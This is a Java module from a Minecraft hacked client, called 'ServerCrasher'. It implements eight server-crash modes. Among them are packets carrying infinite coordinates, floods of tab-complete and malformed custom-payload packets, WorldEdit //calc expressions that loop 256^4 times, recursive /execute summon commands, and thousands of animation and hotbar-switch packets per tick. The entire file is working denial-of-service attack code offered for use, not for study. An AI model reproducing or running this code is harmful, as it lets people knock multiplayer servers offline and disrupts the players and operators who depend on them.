package org.dreamcore.client.feature.impl.misc;

import io.netty.buffer.Unpooled;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.*;
import net.minecraft.util.EnumHand;
import net.minecraft.util.math.BlockPos;
import org.apache.commons.lang3.RandomUtils;
import org.dreamcore.client.event.EventTarget;
import org.dreamcore.client.event.events.impl.player.EventUpdate;
import org.dreamcore.client.feature.Feature;
import org.dreamcore.client.feature.impl.Type;
import org.dreamcore.client.settings.impl.ListSetting;
import org.dreamcore.client.settings.impl.NumberSetting;

import java.util.Random;

public class ServerCrasher extends Feature {

    //public static NumberSetting delay;
    public ListSetting mode = new ListSetting("ServerCrasher Mode", "Infinity", () -> true, "Infinity", "TabComplete", "WorldEdit", "Session", "OP", "WorldEdit2", "xACK", "IllegalSwitcher");

    public NumberSetting delay = new NumberSetting("Delay", 1000, 1, 5000, 1, () -> mode.currentMode.equals("TabComplete"));

    public ServerCrasher() {
        super("ServerCrasher", "Test", Type.Misc);
        //delay = new NumberSetting("Delay", 1000, 1, 5000, 0.1F, () -> mode.currentMode.equals("TabComplete" + "invalidSession"), NumberSetting.NumberType.MS);
        addSettings(delay);
        addSettings(mode);
    }

    @EventTarget
    public void onUpdate(EventUpdate event) {
        this.setSuffix(mode.currentMode);
        if (mode.currentMode.equals("Infinity")) {
            sendPacket(new CPacketPlayer.Position(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, (new Random()).nextBoolean()));
            sendPacket(new CPacketPlayer.Position(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, (new Random()).nextBoolean()));
        } else if (mode.currentMode.equals("TabComplete")) {
            for (int i = 0; i < (delay.getNumberValue()); i++) {
                double rand1 = RandomUtils.nextDouble(0.0D, Double.MAX_VALUE);
                double rand2 = RandomUtils.nextDouble(0.0D, Double.MAX_VALUE);
                double rand3 = RandomUtils.nextDouble(0.0D, Double.MAX_VALUE);
                mc.player.connection.sendPacket(new CPacketTabComplete("뛠뎕곢邆転鞇뻡讉ꋒ뫠㪒潨牵汧獡㩳균鎩裣ꦉ닡릎뛠뎕곢邆転鞇뻡讉ꋒ뫠㪒潨牵汧獡㩳균鎩裣ꦉ닡릎뛠뎕곢邆転鞇뻡讉ꋒ뫠㪒潨牵汧獡㩳균鎩裣ꦉ닡릎뛠뎕곢邆転鞇뻡讉ꋒ뫠㪒潨牵汧獡㩳균鎩裣ꦉ닡릎", new BlockPos(rand1, rand2, rand3), false));
            }
        } else if (mode.currentMode.equals("WorldEdit")) {
            if (mc.player.ticksExisted % 6 == 0) {
                mc.player.sendChatMessage("//calc for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
                mc.player.sendChatMessage("//calculate for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
                mc.player.sendChatMessage("//solve for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
                mc.player.sendChatMessage("//evaluate for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
                mc.player.sendChatMessage("//eval for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
            }
        } else if (mode.currentMode.equals("Session")) {
            for (int i = 0; i < 500; i++) {
                mc.player.connection.sendPacket(new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("뛠뎕곢邆転鞇뻡讉ꋒ뫠㪒潨牵汧獡㩳균鎩裣ꦉ닡릎"))));
                mc.player.connection.sendPacket(new CPacketCustomPayload("MC|Brand", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("뛠뎕곢邆転鞇뻡讉ꋒ뫠㪒潨牵汧獡㩳균鎩裣ꦉ닡릎"))));
                mc.player.connection.sendPacket(new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("뛠뎕곢邆転鞇뻡讉ꋒ뫠㪒潨牵汧獡㩳균鎩裣ꦉ닡릎"))));
                mc.player.connection.sendPacket(new CPacketCustomPayload("MC|BOpen", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("뛠뎕곢邆転鞇뻡讉ꋒ뫠㪒潨牵汧獡㩳균鎩裣ꦉ닡릎"))));
                mc.player.connection.sendPacket(new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("뛠뎕곢邆転鞇뻡讉ꋒ뫠㪒潨牵汧獡㩳균鎩裣ꦉ닡릎"))));
                mc.player.connection.sendPacket(new CPacketCustomPayload("MC|TrList", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("뛠뎕곢邆転鞇뻡讉ꋒ뫠㪒潨牵汧獡㩳균鎩裣ꦉ닡릎"))));
                mc.player.connection.sendPacket(new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("뛠뎕곢邆転鞇뻡讉ꋒ뫠㪒潨牵汧獡㩳균鎩裣ꦉ닡릎"))));
                mc.player.connection.sendPacket(new CPacketCustomPayload("MC|TrSel", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("뛠뎕곢邆転鞇뻡讉ꋒ뫠㪒潨牵汧獡㩳균鎩裣ꦉ닡릎"))));
                mc.player.connection.sendPacket(new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("뛠뎕곢邆転鞇뻡讉ꋒ뫠㪒潨牵汧獡㩳균鎩裣ꦉ닡릎"))));
                mc.player.connection.sendPacket(new CPacketCustomPayload("MC|BEdit", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("뛠뎕곢邆転鞇뻡讉ꋒ뫠㪒潨牵汧獡㩳균鎩裣ꦉ닡릎"))));
                mc.player.connection.sendPacket(new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("뛠뎕곢邆転鞇뻡讉ꋒ뫠㪒潨牵汧獡㩳균鎩裣ꦉ닡릎"))));
                mc.player.connection.sendPacket(new CPacketCustomPayload("MC|BSign", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("뛠뎕곢邆転鞇뻡讉ꋒ뫠㪒潨牵汧獡㩳균鎩裣ꦉ닡릎"))));
            }
        } else if (mode.currentMode.equals("OP")) {
            for (int i = 0; i < 250; i++)
                mc.player.sendChatMessage("/execute @e ~ ~ ~ execute @e ~ ~ ~ execute @e ~ ~ ~ execute @e ~ ~ ~ summon Villager");
        } else if (mode.currentMode.equals("WorldEdit2")) {
            for (int i = 0; i < 250; i++)
                mc.player.connection.sendPacket(new CPacketCustomPayload("WECUI", (new PacketBuffer(Unpooled.buffer())).writeString("\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI")));
        } else if (mode.currentMode.equals("xACK")) {
            for (int i = 0; i < 5000; i++)
                mc.player.connection.sendPacket(new CPacketAnimation(EnumHand.OFF_HAND));
        } else if (mode.currentMode.equals("IllegalSwitcher")) {
            for (int i = 0; i < 550; i++) {
                for (int i2 = 0; i2 < 8; i2++)
                    mc.player.connection.sendPacket(new CPacketHeldItemChange(i2));
            }
        }
    }
}
